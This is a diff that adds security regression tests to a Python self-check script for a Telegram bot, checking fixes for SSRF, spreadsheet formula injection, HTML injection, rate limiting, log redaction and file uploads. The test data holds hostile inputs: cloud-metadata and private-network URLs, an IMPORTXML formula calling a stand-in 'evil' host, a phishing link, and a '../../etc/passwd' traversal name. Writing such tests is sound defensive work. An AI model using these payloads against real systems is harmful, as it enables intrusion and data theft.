@@ -917,6 +917,101 @@ def t_tariff_images():
           any("не отправляются" in a for a in admin))
 
 
+def t_security():
+    """Регрессия по найденным уязвимостям. Каждая проверка — про конкретную
+    дыру из SECURITY_AUDIT.md; если она снова откроется, тест покраснеет."""
+    print("\n\u25b8 Безопасность")
+    bot = load()
+
+    # --- C2: подделка апдейта не должна давать админские права ---
+    bot._REQUEST_TRUSTED[0] = True
+    check("C2 админ опознаётся при подтверждённом источнике", bot.is_admin(999))
+    bot._REQUEST_TRUSTED[0] = False
+    check("C2 при неподтверждённом источнике админа нет", not bot.is_admin(999))
+    bot._REQUEST_TRUSTED[0] = True
+
+    # --- C3: SSRF ---
+    blocked = [
+        ("http://169.254.169.254/latest/meta-data/", "метаданные облака"),
+        ("http://127.0.0.1:8080/", "локальный адрес"),
+        ("http://localhost/", "localhost"),
+        ("http://10.1.2.3/", "сеть 10/8"),
+        ("http://192.168.0.1/", "сеть 192.168"),
+        ("http://172.16.5.5/", "сеть 172.16"),
+        ("http://[::1]/", "IPv6 loopback"),
+        ("file:///etc/passwd", "схема file"),
+        ("gopher://evil/", "схема gopher"),
+        ("http://db.internal/", "служебный домен"),
+        ("http://example.com:22/", "порт SSH"),
+    ]
+    bad = [why for url, why in blocked if bot.ssrf_check(url)[0]]
+    check("C3 закрытые адреса не пропускаются", not bad, ", ".join(bad))
+
+    real = bot.socket.getaddrinfo
+    bot.socket.getaddrinfo = lambda h, p, **k: [(2, 1, 6, "", ("93.184.216.34", 443))]
+    check("C3 обычный сайт проверяется", bot.ssrf_check("https://example.com/")[0])
+    bot.socket.getaddrinfo = lambda h, p, **k: [(2, 1, 6, "", ("127.0.0.1", 443))]
+    check("C3 домен, указывающий на localhost, отклоняется",
+          not bot.ssrf_check("https://rebind.example/")[0])
+    bot.socket.getaddrinfo = real
+
+    calls = []
+    bot._fetch_once = lambda u, t=6, m=400000: (calls.append(u), (200, {}, "<html></html>", 0.1, u))[1]
+    bot._fetch("http://169.254.169.254/")
+    check("C3 запрос к метаданным не выполняется", not calls)
+
+    # --- H1: formula injection ---
+    cases = ["=IMPORTXML(\"http://evil\",\"//a\")", "+1+1", "-2+3", "@SUM(A1)", "\t=cmd"]
+    safe = [bot.sheet_safe(c) for c in cases]
+    check("H1 формулы обезврежены", all(x.startswith("'") for x in safe), str(safe[:2]))
+    check("H1 обычный текст не портится", bot.sheet_safe("ООО «Ромашка»") == "ООО «Ромашка»")
+    check("H1 вложенные значения тоже чистятся",
+          bot.sheet_safe({"a": ["=x"]})["a"][0].startswith("'"))
+    bot._SHEET_Q.clear()
+    bot.post_to_sheet({"table": "T", "company": "=HYPERLINK(\"http://evil\")"})
+    check("H1 в очередь попадает уже безопасное значение",
+          bot._SHEET_Q and str(bot._SHEET_Q[0]["company"]).startswith("'"))
+
+    # --- H2: HTML-инъекция ---
+    t = bot.clean_user_text('<a href="https://phish">Оплатить</a>')
+    check("H2 теги не доходят до чата", "<a" not in t and "&lt;a" in t)
+    check("H2 незакрытый тег не ломает отправку", "<" not in bot.clean_user_text("<b"))
+    check("H2 длина ограничена", len(bot.clean_user_text("я" * 5000)) <= bot.MAX_USER_TEXT + 1)
+    check("H2 управляющие символы убраны", "\x07" not in bot.clean_user_text("а\x07б"))
+
+    # --- H3: ограничение частоты ---
+    bot2 = load()
+    bot2._REQUEST_TRUSTED[0] = True
+    limit = bot2.RATE_LIMITS["audit"][0]
+    passed = sum(1 for _ in range(limit + 4) if bot2.rate_ok(555, "audit"))
+    check("H3 аудит ограничен по частоте", passed == limit, f"прошло {passed}")
+    check("H3 админа лимит не трогает", all(bot2.rate_ok(999, "audit") for _ in range(20)))
+
+    # --- M1/M5: чистка логов ---
+    r = bot.redact("сбой на https://api.telegram.org/bot123456789:AAF-abcdefghijklmnopqrstuvwxyz012345/send")
+    check("M5 токен не попадает в лог", "AAF-" not in r and "‹токен›" in r)
+    check("M5 телефон вырезается", "‹телефон›" in bot.redact("клиент +7 999 123-45-67"))
+    check("M5 почта вырезается", "‹почта›" in bot.redact("пишет ivan@mail.ru"))
+
+    # --- M3: проверка файлов ---
+    ok_ext, _ = bot.upload_allowed("логотип.png", 1000)
+    check("M3 картинка принимается", ok_ext)
+    bad_ext, why = bot.upload_allowed("вирус.exe", 1000)
+    check("M3 исполняемый файл отклоняется", not bad_ext)
+    big, _ = bot.upload_allowed("video.mp4", 99 * 1024 * 1024)
+    check("M3 слишком большой файл отклоняется", not big)
+    check("M3 путь в имени обезврежен",
+          "/" not in bot.safe_file_name("../../etc/passwd")
+          and bot.safe_file_name("../../etc/passwd") == "passwd")
+
+    # --- C1: крон закрыт ---
+    src = open(BOT, encoding="utf-8").read()
+    check("C1 крон требует секрет", "_cron_allowed" in src and "CRON_SECRET" in src)
+    check("C1 путь сверяется целиком, а не подстрокой", '"cron" in self.path' not in src)
+    check("C2 сравнение секрета за постоянное время", "compare_digest" in src)
+    check("M2 размер тела ограничен", "MAX_BODY_BYTES" in src)
+
+
 if __name__ == "__main__":
     print("═" * 60)
     print("  ONYX — самопроверка бота")
@@ -926,7 +1021,7 @@ if __name__ == "__main__":
                t_funnel, t_order_before_tariff, t_navigation, t_demos,
                t_audit, t_start_checklist, t_deeplink_audit, t_drive, t_consent, t_reviews,
                t_no_blocking, t_sheets_batch, t_kv_mode, t_rich_fallback,
-               t_tariff_images):
+               t_tariff_images, t_security):
         try:
             fn()
         except Exception as e:
